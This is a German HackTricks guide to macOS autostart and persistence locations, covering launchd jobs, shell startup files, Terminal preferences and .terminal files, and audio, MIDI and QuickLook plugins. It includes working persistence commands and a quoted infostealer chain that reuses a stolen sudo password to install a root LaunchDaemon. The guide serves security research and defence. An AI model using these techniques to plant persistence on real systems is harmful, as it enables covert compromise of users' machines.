# macOS-Autostart

{{#include ../banners/hacktricks-training.md}}

Dieser Abschnitt basiert größtenteils auf der Blogreihe [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Ziel ist es, Orte zu identifizieren, an denen das Schreiben einer Datei später zur Codeausführung führen kann, welches Ereignis die Ausführung auslöst und welche Berechtigungen erforderlich sind. Dass ein Ort vorhanden ist, beweist nicht, dass der Mechanismus aktiviert ist. Die unten aufgeführten lokalen Prüfungen wurden unter macOS 26.5.2 (5. Oktober 2026) durchgeführt; sie belegen nicht, dass sich alle macOS-Versionen gleich verhalten.

> [!NOTE]
> „Durch Schreiben ausgelöst“ bedeutet nicht immer „wird unmittelbar nach dem Schreiben ausgeführt“. Manche Orte werden erst bei der Anmeldung, beim Start einer bestimmten Anwendung oder nach einer Benutzeraktion ausgelesen. Eine beschreibbare Payload innerhalb eines bereits konfigurierten Jobs unterscheidet sich außerdem von der Berechtigung, einen neuen Job zu registrieren. Teste eine Technik, bevor du dich darauf verlässt, in einem entbehrlichen Benutzerkonto oder einer VM.

## Sandbox-Umgehung

> [!TIP]
> Hier findest du Startorte, die für eine **Sandbox-Umgehung** nützlich sind. Sie ermöglichen es, etwas auszuführen, indem du es einfach **in eine Datei schreibst** und auf eine sehr **gängige** **Aktion**, eine festgelegte **Zeitspanne** oder eine **Aktion wartest, die du normalerweise aus einer Sandbox heraus ausführen kannst**, ohne Root-Berechtigungen zu benötigen.

### Launchd

- Nützlich für Sandbox-Umgehung: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Orte

- **`/Library/LaunchAgents`**
  - **Auslöser**: Benutzeranmeldung (oder explizite Registrierung)
  - Root erforderlich
- **`/Library/LaunchDaemons`**
  - **Auslöser**: Systemstart (oder explizite Registrierung)
  - Root erforderlich
- **`/System/Library/LaunchAgents`**
  - **Auslöser**: Benutzeranmeldung; geschützter Apple-Systemort
- **`/System/Library/LaunchDaemons`**
  - **Auslöser**: Systemstart; geschützter Apple-Systemort
- **`~/Library/LaunchAgents`**
  - **Auslöser**: Erneute Anmeldung

Es gibt keinen von `launchd` durchsuchten Ort namens `~/Library/LaunchDaemons`. Jobs pro Benutzer gehören in `~/Library/LaunchAgents`; das Systemverzeichnis für Daemons ist `/Library/LaunchDaemons`. Apples [Startanleitung für launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) dokumentiert die durchsuchten Orte.

> [!TIP]
> Eine interessante Tatsache: **`launchd`** enthält eine eingebettete Property List im Mach-o-Abschnitt `__Text.__config`, die weitere bekannte Dienste enthält, die launchd starten muss. Außerdem können diese Dienste `RequireSuccess`, `RequireRun` und `RebootOnSuccess` enthalten, was bedeutet, dass sie ausgeführt werden und erfolgreich abgeschlossen sein müssen.
>
> Natürlich kann sie aufgrund der Code-Signierung nicht geändert werden.

#### Beschreibung & Ausnutzung

**`launchd`** ist der **erste** **Prozess**, der beim Start vom OS-X-Kernel ausgeführt wird, und der letzte, der beim Herunterfahren beendet wird. Er sollte immer die **PID 1** haben. Dieser Prozess **liest und führt** die in den **ASEP**-**Plists** angegebenen Konfigurationen an folgenden Orten aus:

- `/Library/LaunchAgents`: Vom Administrator installierte Agents pro Benutzer
- `/Library/LaunchDaemons`: Vom Administrator installierte systemweite Daemons
- `/System/Library/LaunchAgents`: Von Apple bereitgestellte Agents pro Benutzer.
- `/System/Library/LaunchDaemons`: Von Apple bereitgestellte systemweite Daemons.

Wenn sich ein Benutzer anmeldet, lädt `launchd` die Plists in `~/Library/LaunchAgents` dieses Benutzers mit dessen Berechtigungen. Jobs werden entsprechend ihren Schlüsseln gestartet; allein das Laden einer Plist bedeutet nicht, dass ein Prozess sofort ausgeführt wird.

**Der Hauptunterschied zwischen Agents und Daemons besteht darin, dass Agents geladen werden, wenn sich der Benutzer anmeldet, während Daemons beim Systemstart geladen werden** (denn es gibt Dienste wie ssh, die ausgeführt werden müssen, bevor ein Benutzer auf das System zugreift). Agents können außerdem eine GUI verwenden, während Daemons im Hintergrund laufen müssen.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Jedes Element von `ProgramArguments` ist ein separates Argument; `launchd` interpretiert keine einzelne Zeichenfolge als Shell-Befehl. Das korrigierte Beispiel oben lässt sich mit `plutil -lint /path/to/example.plist` auf Syntax prüfen, ohne es zu laden. Siehe den lokalen Eintrag `man launchd.plist` zu `ProgramArguments`, `RunAtLoad` und `KeepAlive`.

#### Dateiereignis-Trigger in vorhandenen Jobs

Ein **bereits geladener** Agent oder Daemon kann `WatchPaths` verwenden, um beim Ändern eines angegebenen Pfads zu starten. `QueueDirectories` startet einen Job, solange ein Verzeichnis nicht leer ist; `StartOnMount` startet ihn beim Einbinden eines Volumes. [Apples launchd-Anleitung](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) enthält Beispiele für `WatchPaths` und `QueueDirectories`. Ein Schreibvorgang in eine überwachte Datei löst den **bereits konfigurierten Job** aus; beliebige Codeausführung ist dadurch nur möglich, wenn der Schreibende auch die ausführbare Datei, das Skript oder die vom Job interpretierten Daten kontrollieren kann. Eine neue plist-Datei an einem Ort zu schreiben, der nicht überwacht oder registriert ist, lädt sie nicht.

Dieses selbstbereinigende PoC registriert einen **temporären User-Agent** mit eindeutigem Namen, ändert nur die eigene überwachte Datei und entfernt den Agenten. Es wurde erfolgreich unter macOS 26.5.2 ohne Abmeldung oder Neustart ausgeführt:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Der lokale Lauf gab `watch fired: True` aus, und `bootout` war erfolgreich. `launchctl bootstrap` wird hier nur innerhalb des isolierten PoC verwendet; für einen bereits geladenen Job ist es **nicht** erforderlich. Um einen vorhandenen Job sicher zu prüfen, lies seine plist und den aufgelösten Pfad aus `ProgramArguments` aus und prüfe, ob die betreffende ausführbare Datei oder interpretierte Datei beschreibbar ist, ohne sie zu verändern.

In manchen Fällen muss ein **Agent vor der Benutzeranmeldung ausgeführt werden**. Diese werden **PreLoginAgents** genannt. Das ist beispielsweise nützlich, um beim Anmelden unterstützende Technologie bereitzustellen. Sie sind auch unter `/Library/LaunchAgents` zu finden (siehe [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ein Beispiel).

> [!TIP]
> Neue Konfigurationsdateien für Daemons oder Agents werden **nach dem nächsten Neustart oder mit** `launchctl load <target.plist>` **geladen**. Es ist **auch möglich, .plist-Dateien ohne diese Erweiterung zu laden** mit `launchctl -F <file>` (diese plist-Dateien werden jedoch nach einem Neustart nicht automatisch geladen).\
> Es ist auch möglich, sie mit `launchctl unload <target.plist`> **zu entladen** (der dadurch angegebene Prozess wird beendet),
>
> Um **sicherzustellen**, dass **nichts** (wie etwa eine Überschreibung) **verhindert**, dass ein **Agent** oder **Daemon** **ausgeführt wird**, führe Folgendes aus: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Liste alle Agents und Daemons auf, die vom aktuellen Benutzer geladen wurden:

```bash
launchctl list
```

#### Beispiel für eine bösartige LaunchDaemon-Kette (wiederverwendetes Passwort)

Ein aktueller macOS-Infostealer verwendete ein **abgefangenes sudo-Passwort**, um einen User Agent und einen LaunchDaemon mit Root-Rechten einzurichten:<sup>[[1]](#references)</sup>

- Die Agent-Schleife nach `~/.agent` schreiben und ausführbar machen.
- Eine plist unter `/tmp/starter` erstellen, die auf diesen Agent verweist.
- Das gestohlene Passwort mit `sudo -S` wiederverwenden, um die plist nach `/Library/LaunchDaemons/com.finder.helper.plist` zu kopieren, `root:wheel` festzulegen und sie mit `launchctl load` zu laden.
- Den Agent still mit `nohup ~/.agent >/dev/null 2>&1 &` starten, um die Ausgabe abzukoppeln.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Eine Daemon-plist in `/Library/LaunchDaemons` wird nicht dadurch sicher, dass sie einem Benutzer gehört. `launchd` erfordert für Systemjobs geeignete Eigentums- und Berechtigungsverhältnisse und kann eine unsichere plist ablehnen. Ein Daemon im Besitz von root läuft normalerweise als root, sofern seine Konfiguration kein anderes Konto auswählt. Prüfe den `UserName`, `GroupName`, die Eigentumsverhältnisse und die `launchctl`-Diagnosen des Jobs; leite die Ausführungsidentität nicht allein aus dem Namen des Eigentümers der plist ab.

#### Weitere Informationen zu launchd

**`launchd`** ist der **erste** User-Mode-Prozess, der vom **Kernel** gestartet wird. Der Prozessstart muss **erfolgreich** sein und der Prozess **darf nicht beendet werden oder abstürzen**. Er ist sogar gegen einige **Kill-Signale geschützt**.

Zu den ersten Aufgaben von `launchd` gehört es, alle **Daemons** zu **starten**, etwa:

- **Timer-Daemons**, die anhand der Ausführungszeit geplant werden:
  - `com.apple.atrun.plist` ruft `/usr/libexec/atrun` mit `StartInterval = 30` Sekunden in macOS 26.5.2 auf; der effektive Aktivierungsstatus kann vom `Disabled`-Schlüssel der plist abweichen, da launchd Overrides separat speichert.
  - `com.vix.cron.plist` ruft `/usr/sbin/cron` auf, solange `/usr/lib/cron/tabs` Jobs enthält. `com.apple.systemstats.daily` ist ein anderer geplanter Dienst und nicht der cron-Daemon.
- **Netzwerk-Daemons**, wie:
  - `org.cups.cups-lpd`: Lauscht über TCP (`SockType: stream`) mit `SockServiceName: printer`
    - SockServiceName muss entweder ein Port oder ein Dienst aus `/etc/services` sein
  - `com.apple.xscertd.plist`: Lauscht über TCP auf Port 1640
- **Pfad-Daemons**, die ausgeführt werden, wenn sich ein angegebener Pfad ändert:
  - `com.apple.postfix.master`: Überwacht den Pfad `/etc/postfix/aliases`
- **IOKit-Benachrichtigungs-Daemons**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach-Port:**
  - `com.apple.xscertd-helper.plist`: Im Eintrag `MachServices` ist der Name `com.apple.xscertd.helper` angegeben
- **UserEventAgent:**
  - Dies unterscheidet sich vom vorherigen Punkt. Dabei lässt launchd Apps als Reaktion auf bestimmte Ereignisse starten. In diesem Fall ist jedoch nicht `launchd`, sondern `/usr/libexec/UserEventAgent` die beteiligte Haupt-Binary. Sie lädt Plugins aus dem durch SIP geschützten Ordner /System/Library/UserEventPlugins/, wobei jedes Plugin seinen Initializer im Schlüssel `XPCEventModuleInitializer` angibt oder bei älteren Plugins im Dict `CFPluginFactories` unter dem Schlüssel `FB86416D-6164-2070-726F-70735C216EC0` seiner `Info.plist`.

### Shell-Startdateien

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Dafür musst du jedoch eine App mit einem TCC Bypass finden, die eine Shell ausführt, welche diese Dateien lädt

#### Speicherorte

- **`~/.zshenv`** (oder eine neuere kompilierte Datei **`~/.zshenv.zwc`**)
  - **Auslöser**: Jeder gewöhnliche zsh-Aufruf, einschließlich eines nichtinteraktiven `zsh -c`; `zsh -f` überspringt Benutzer-Startdateien.
- **`~/.zshrc`**
  - **Auslöser**: Eine interaktive zsh wird gestartet.
- **`~/.zprofile`, `~/.zlogin`**
  - **Auslöser**: Eine Login-zsh wird gestartet; diese Dateien werden jeweils vor und nach `.zshrc` gelesen.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Auslöser**: Ein Terminal mit zsh öffnen
  - Root erforderlich
- **`~/.zlogout`**
  - **Auslöser**: Eine Login-zsh wird normal beendet, nicht bei jedem Terminal- oder Shell-Ende.
- **`/etc/zlogout`**
  - **Auslöser**: Ein Terminal mit zsh beenden
  - Root erforderlich
- Möglicherweise weitere in: **`man zsh`**
- **`~/.bashrc`**
  - **Auslöser**: Eine interaktive **Nicht-Login**-Bash starten. Eine interaktive Login-Bash liest sie nur, wenn eine Login-Datei sie explizit einbindet.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Auslöser**: Eine Login-Bash starten; die erste lesbare Datei in dieser Reihenfolge wird ausgeführt. `~/.profile` wird übersprungen, wenn eine der beiden vorherigen Dateien existiert.
- **`/etc/profile`**
  - **Auslöser**: Eine Login-Bash starten; zum Ändern ist root erforderlich.
- **`~/.tcshrc`** oder, falls nicht vorhanden, **`~/.cshrc`**
  - **Auslöser**: `tcsh` starten, einschließlich eines nichtinteraktiven `tcsh -c` auf diesem Mac. Der Benutzer muss tatsächlich `tcsh` aufrufen; es ist nicht die standardmäßige macOS-Shell.
- **`~/.login`**
  - **Auslöser**: Eine Login-`tcsh` nach ihrer rc-Datei starten.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Auslöser**: Soll mit xterm ausgelöst werden, aber xterm **ist nicht installiert** und auch nach der Installation wird dieser Fehler ausgegeben: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Beschreibung & Exploitation

Beim Starten einer Shell-Umgebung wie `zsh` oder `bash` werden **bestimmte Startdateien ausgeführt**. macOS verwendet derzeit `/bin/zsh` als Standard-Shell. Ob Terminal oder SSH eine Login- oder interaktive Shell startet, hängt von der jeweiligen Konfiguration ab; gehe nicht davon aus, dass in jeder Sitzung alle oben genannten Dateien ausgeführt werden. `bash` und `sh` sind zwar ebenfalls in macOS vorhanden, müssen aber explizit aufgerufen werden, um sie zu verwenden.<sup>[[2]](#references)</sup> Die [Referenz zu zsh-Startdateien](https://zsh.sourceforge.io/Doc/Release/Files.html) beschreibt die Reihenfolge, den `ZDOTDIR`-Override und die `.zwc`-Regel.

Das folgende schreibgeschützte Experiment verwendete ein entbehrliches `ZDOTDIR` unter macOS 26.5.2. Es zeigt, welche Benutzerdateien gelesen wurden; keine echte Shell-Startdatei wurde geändert:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Die beobachtete Reihenfolge war `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` muss bereits auf das alternative Verzeichnis zeigen; Dateien einfach in einem beliebigen Verzeichnis abzulegen, reicht nicht aus.

[Die Referenz zu Bash-Startdateien](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) unterscheidet zwischen Login- und interaktiven Shells. Auf der macOS-Testmaschine mit Version 26.5.2 ergab ein isoliertes `HOME` mit allen vier Benutzer-Startdateien Folgendes: `bash -c` → keine, `bash -ic` → `.bashrc`, `bash -lc` und `bash -lic` → nur `.bash_profile`. Wurde `.bash_profile` entfernt, las Login Bash zuerst `.bash_login` und dann `.profile`, wenn auch diese Datei entfernt wurde. `BASH_ENV` kann nicht interaktive Bash auf eine Datei verweisen lassen, aber diese Umgebungsvariable muss bereits im aufrufenden Prozess gesetzt sein. Ein explizites `exit` aus einer Login Bash kann außerdem `~/.bash_logout` laden.

Das lokale Handbuch `tcsh(1)` dokumentiert eine eigene Startreihenfolge. Mit einem temporären `HOME` las `/bin/tcsh -c :` `.tcshrc` oder, falls `.tcshrc` fehlte, `.cshrc`. Eine temporäre Login `tcsh` las `.tcshrc` und `.login`. Bei diesen Prüfungen wurden ausschließlich temporäre Dateien erstellt und wieder entfernt.

### Erneut geöffnete Apps

> [!CAUTION]
> Beim Testen wurde die App durch das Einrichten der angegebenen Exploitation und anschließendes Ab- und wieder Anmelden oder sogar durch einen Neustart nicht ausgeführt. Möglicherweise muss die App bereits laufen, wenn diese Aktionen durchgeführt werden.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Auslöser**: Anwendungen beim Neustart erneut öffnen

#### Beschreibung & Exploitation

Alle erneut zu öffnenden Anwendungen befinden sich in der plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Damit die erneut zu öffnenden Anwendungen deine eigene starten, musst du sie einfach **zur Liste hinzufügen**.

Die UUID findest du, indem du dieses Verzeichnis auflistest oder folgenden Befehl ausführst: `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Um zu prüfen, welche Anwendungen erneut geöffnet werden, kannst du Folgendes ausführen:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Um **eine Anwendung zu dieser Liste hinzuzufügen**, können Sie Folgendes verwenden:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal-Einstellungen

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal verwendete die FDA-Berechtigungen des Benutzers, der es verwendet

#### Speicherort

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Auslöser**: Öffne ein neues Terminal-Fenster oder einen neuen Tab mit dem Profil, dessen Shell-Einstellungen den Startbefehl enthalten

#### Beschreibung & Exploitation

In **`~/Library/Preferences`** werden die Einstellungen des Benutzers für die Anwendungen gespeichert. Einige dieser Einstellungen können eine Konfiguration enthalten, mit der **andere Anwendungen/Skripte ausgeführt werden**.<sup>[[5]](#references)</sup>

Terminal kann beispielsweise beim Start einen Befehl ausführen:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Diese Konfiguration spiegelt sich wie folgt in der Datei **`~/Library/Preferences/com.apple.Terminal.plist`** wider:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Wenn das betreffende Profil einen Startbefehl enthält und Terminal diese Einstellung ausliest, kann eine neue Sitzung mit diesem Profil ihn ausführen. [Apples aktuelle Terminal-Anleitung](https://support.apple.com/guide/terminal/trmlshll/mac) dokumentiert den profilbezogenen Befehl unter **Shell → Startup**. Terminal lediglich zu öffnen, ohne eine neue Sitzung mit diesem Profil zu starten, reicht nicht aus. Die unten beschriebenen Einstellungsänderungen wurden auf dem Research-Mac **nicht** vorgenommen.

Dies lässt sich über die CLI hinzufügen mit:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal-Skripte / Andere Dateiendungen

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal kann die FDA-Berechtigungen des Benutzers nutzen

#### Speicherort

- **Beliebiger Ort**
  - **Auslöser**: Die jeweilige Datei `.terminal`, `.command` oder `.tool` öffnen

#### Beschreibung & Ausnutzung

Wenn ein Benutzer eine Einstellungsdatei **`.terminal`** öffnet, kann Terminal anhand ihres Profils eine Sitzung erstellen. Ausführbare Dateien **`.command`** und **`.tool`** können ebenfalls in Terminal geöffnet werden. Dies ist ein expliziter Auslöser beim Öffnen einer Datei und keine Ausführung, die allein durch das Öffnen von Terminal erfolgt. Ein eventuell übernommener TCC-Zugriff hängt von den tatsächlichen Berechtigungen von Terminal und der ausgeführten Aktion ab. Das historische Beispiel unten wurde nicht auf dem Research-Mac ausgeführt.

Versuche es mit:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

You könntet auch die Erweiterungen **`.command`**, **`.tool`** mit regulärem Shell-Script-Inhalt verwenden; sie werden ebenfalls von Terminal geöffnet.

> [!CAUTION]
> Wenn Terminal **Full Disk Access** hat, kann es diese Aktion abschließen (beachtet, dass der ausgeführte Befehl in einem Terminal-Fenster sichtbar ist).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC-Bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Möglicherweise erhaltet ihr zusätzliche TCC-Berechtigungen

#### Speicherort

- **`/Library/Audio/Plug-Ins/HAL`**
  - Root erforderlich
  - **Auslöser**: Der Core-Audio-Server lädt ein kompatibles HAL-Geräte-Plugin; ein Neustart des Servers kann eine erneute Erkennung auslösen
- **`/Library/Audio/Plug-ins/Components`**
  - Root erforderlich
  - **Auslöser**: Ein Audio-Host erkennt das installierte Audio Unit und instanziiert es
- **`~/Library/Audio/Plug-ins/Components`**
  - **Auslöser**: Ein Audio-Host erkennt das installierte Audio Unit und instanziiert es
- **`/System/Library/Components`**
  - Von Apple bereitgestellter, systemgeschützter Speicherort
  - **Auslöser**: Ein Audio-Host instanziiert eine passende Systemkomponente

#### Beschreibung

Laut den vorherigen Writeups ist es möglich, **einige Audio-Plugins zu kompilieren** und laden zu lassen.<sup>[[6]](#references)[[7]](#references)</sup>

HAL-Geräte-Plugins und Audio Units werden über unterschiedliche Ladepfade geladen. [Apples Anleitung zum Hosting von Audio Units](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) besagt, dass ein Host eine Komponente finden und instanziieren muss; allein das Kopieren in ein Scan-Verzeichnis oder ein Neustart von `coreaudiod` beweist nicht, dass sie ausgeführt wird. AUv2-Plugins laufen im Host-Prozess, während [Apples aktuelle Anleitung zu Audio Units](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) besagt, dass AUv3 unter macOS standardmäßig in einem separaten Prozess läuft. Die Anforderungen an Signatur, Sandbox und Library Validation hängen vom Host ab. Auf dem Research-Mac wurde kein Audio-Plugin installiert oder ausgeführt.

### CoreMIDI Drivers (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Euer Code läuft im `MIDIServer`-Prozess, nicht in der Sandbox eurer App
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` läuft mit einem eigenen `seatbelt`-Sandbox-Profil

#### Speicherort

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Kein Root erforderlich (vom Benutzer beschreibbar)
  - **Auslöser**: `MIDIServer` startet (erneut). Er wird bei Bedarf gestartet, sobald irgendein Prozess CoreMIDI verwendet (beim Öffnen von *Audio MIDI Setup*, GarageBand, einer DAW oder einer Seite, die WebMIDI nutzt)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Root erforderlich
  - **Auslöser**: wie oben

#### Beschreibung & Ausnutzung

Apples `MIDIServer` (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) lädt MIDI-**Treiber**-Bundles aus den Verzeichnissen `Audio/MIDI Drivers`. Die Binärdatei ist von Apple signiert, enthält aber die Berechtigung `com.apple.security.cs.disable-library-validation`. Daher lädt sie auch ein Bundle, das **unsigniert oder ad-hoc von einem anderen Team signiert ist**, wodurch Codeausführung in einem separaten, Apple-eigenen Prozess **ohne Root** möglich wird.<sup>[[53]](#references)</sup>

Unter macOS 26 verifiziert (nur lesend):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Ein Treiber ist ein Standard-Bundle, das eine `MIDIDriverInterface`-Factory exportiert. Wenn du die Payload in der Factory/im Constructor platzierst, wird sie ausgeführt, sobald `MIDIServer` die Treiber ermittelt. Baue sie, lege sie unter `~/Library/Audio/MIDI Drivers/Evil.plugin` ab und löse das Laden ohne Abmeldung oder Neustart aus:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook-Plug-ins

Write-up: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [🟠](https://emojipedia.org/large-orange-circle)
  - Möglicherweise erhältst du zusätzlichen TCC-Zugriff

#### Speicherort

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beschreibung und Ausnutzung

QuickLook-Plug-ins können ausgeführt werden, wenn du **die Vorschau einer Datei öffnest** (die Leertaste drücken, während die Datei im Finder ausgewählt ist) und ein **Plug-in für diesen Dateityp** installiert ist.<sup>[[8]](#references)</sup>

